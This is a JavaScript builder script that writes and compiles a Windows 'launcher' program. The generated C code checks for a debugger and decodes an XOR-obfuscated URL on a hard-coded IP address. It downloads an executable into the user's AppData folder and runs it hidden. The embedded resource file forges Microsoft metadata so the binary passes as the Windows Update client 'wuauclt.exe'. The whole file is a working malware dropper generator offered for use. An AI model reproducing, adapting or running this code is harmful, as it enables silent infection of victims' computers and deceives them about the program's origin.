// language: JavaScript, file: builder/compile.js
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';

const execFileP = promisify(execFile);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';

function rcSource() {
  return `
#include <windows.h>
1 ICON "icon.ico"
VS_VERSION_INFO VERSIONINFO
FILEVERSION     1,0,0,0
PRODUCTVERSION  1,0,0,0
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            VALUE "FileDescription",  "Windows Setup Helper"
            VALUE "FileVersion",      "10.0.19041.1"
            VALUE "InternalName",     "wuauclt"
            VALUE "OriginalFilename", "wuauclt.exe"
            VALUE "ProductName",      "Microsoft Windows"
        END
    END
END
`;
}

function cSource({ ip, key }) {
  const url = `http://${ip}/api/downloads/st.exe`;
  const xorKey = [0x4B, 0x2A, 0x11, 0x9C]; 
  const encUrl = Array.from(url).map((c, i) => c.charCodeAt(0) ^ xorKey[i % xorKey.length]);
  const urlArr = encUrl.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');

  return `
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

void decrypt_url(wchar_t* out) {
    unsigned char enc[] = { ${urlArr} };
    unsigned char key[] = { 0x4B, 0x2A, 0x11, 0x9C };
    int key_len = sizeof(key);
    for (int i = 0; i < sizeof(enc); i++) {
        out[i] = (wchar_t)(enc[i] ^ key[i % key_len]);
    }
    out[sizeof(enc)] = 0;
}

void download_file(const wchar_t* url, const wchar_t* dest) {
    URL_COMPONENTS uc = {0};
    uc.dwStructSize = sizeof(uc);
    wchar_t host[256] = {0};
    wchar_t path[1024] = {0};
    uc.lpszHostName = host;
    uc.dwHostNameLength = 256;
    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = 1024;

    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return;

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {
        
        HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD dwSize = 0, dwDownloaded = 0;
            do {
                dwSize = 0;
                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
                if (dwSize == 0) break;
                BYTE* pBuffer = (BYTE*)malloc(dwSize);
                if (pBuffer) {
                    if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
                        DWORD written;
                        WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
                    }
                    free(pBuffer);
                }
            } while (dwSize > 0);
            CloseHandle(hFile);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    if (IsDebuggerPresent()) return 1;

    wchar_t appData[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) return 1;
    
    wchar_t loaderDir[MAX_PATH];
    _snwprintf(loaderDir, MAX_PATH, L"%ls\\\\loader", appData);
    CreateDirectoryW(loaderDir, NULL);

    // 1. Write key.json FIRST
    wchar_t keyPath[MAX_PATH];
    _snwprintf(keyPath, MAX_PATH, L"%ls\\\\key.json", loaderDir);
    
    char keyJson[512];
    _snprintf(keyJson, sizeof(keyJson), "{\"key\": \"${key}\"}");
    
    HANDLE hKey = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hKey != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hKey, keyJson, strlen(keyJson), &written, NULL);
        CloseHandle(hKey);
    }

    // 2. Download st.exe
    wchar_t dest[MAX_PATH];
    _snwprintf(dest, MAX_PATH, L"%ls\\\\st.exe", loaderDir);

    wchar_t url[1024];
    decrypt_url(url);
    download_file(url, dest);

    // 3. Launch st.exe silently
    char ansiDest[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, dest, -1, ansiDest, MAX_PATH, NULL, NULL);
    WinExec(ansiDest, SW_HIDE);

    return 0;
}
`;
}

export async function compileLauncher({ key, config, baseExe }) {
  let ip = "31.58.77.63";
  if (config && config.ip) ip = config.ip;

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
  const cPath      = path.join(workDir, 'launcher.c');
  const rcPath     = path.join(workDir, 'app.rc');
  const resPath    = path.join(workDir, 'app.res');
  const outPath    = path.join(workDir, 'launcher.exe');

  fs.writeFileSync(cPath, cSource({ ip, key }));
  fs.writeFileSync(rcPath, rcSource());

  const iconSourcePath = path.join(__dirname, '..', 'icon.ico');
  if (fs.existsSync(iconSourcePath)) {
    fs.copyFileSync(iconSourcePath, path.join(workDir, 'icon.ico'));
  } else {
    const dummyIcon = Buffer.from('00000100010001010000010018003000000016000000280000000100000002000000010018000000000000000000000000000000000000000000000000000000000000000000', 'hex');
    fs.writeFileSync(path.join(workDir, 'icon.ico'), dummyIcon);
  }

  try {
    await execFileP(WINDRES, [
      '-I', workDir, '-i', rcPath, '-o', resPath, '--input-format=rc', '--output-format=coff'
    ], { cwd: workDir, timeout: 30_000 });

    await execFileP(CC, [
      '-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
      '-lwinhttp', '-lshell32', '-lole32', '-luser32', '-lkernel32'
    ], { cwd: workDir, timeout: 60_000 });

    return fs.readFileSync(outPath);
  } finally {
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
  }
}